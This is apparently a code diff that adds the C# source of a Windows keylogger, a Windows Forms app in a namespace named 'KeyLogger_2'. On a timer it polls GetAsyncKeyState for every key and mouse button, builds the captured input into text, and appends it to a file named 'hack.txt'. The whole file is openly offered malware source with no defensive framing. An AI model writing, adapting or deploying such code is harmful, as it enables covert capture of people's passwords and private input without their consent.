@@ -1,0 +1,91 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace KeyLogger_2
+{
+
+    public partial class Form1 : Form
+    {
+        [DllImport("User32.dll")] private static extern short GetAsyncKeyState(int vKey);
+
+        string texto = "";
+
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            string buffer = "";
+
+            string temp = "";
+
+            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
+            {
+                if (GetAsyncKeyState(i) == -32767)
+                {
+    
+                    temp = Enum.GetName(typeof(Keys), i);
+                                                           
+                    switch (Enum.GetName(typeof(Keys), i))
+                    {
+                        case "Space":
+                            buffer += " ";
+                            break;
+                        case "Enter":
+                            //buffer += "\r\n";
+                            buffer += "[<|]";
+                            break;
+                        case "LButton":
+                            //Click Derecho
+                            buffer += "[CI]";
+                            break;
+
+                        default:
+                            buffer += Enum.GetName(typeof(Keys), i);
+                            break;
+                    }
+                }
+
+            }
+
+            texto += buffer;
+
+            if (texto.Length > 10)
+            {
+                archivo(texto);
+                texto = "";
+            }
+
+
+        }
+
+        private void archivo(string txt)
+        {
+
+            StreamWriter stream = new StreamWriter("hack.txt", true);
+
+            stream.Write(txt);
+
+            stream.Close();
+
+
+        }
+
+
+
+
+    }
+}
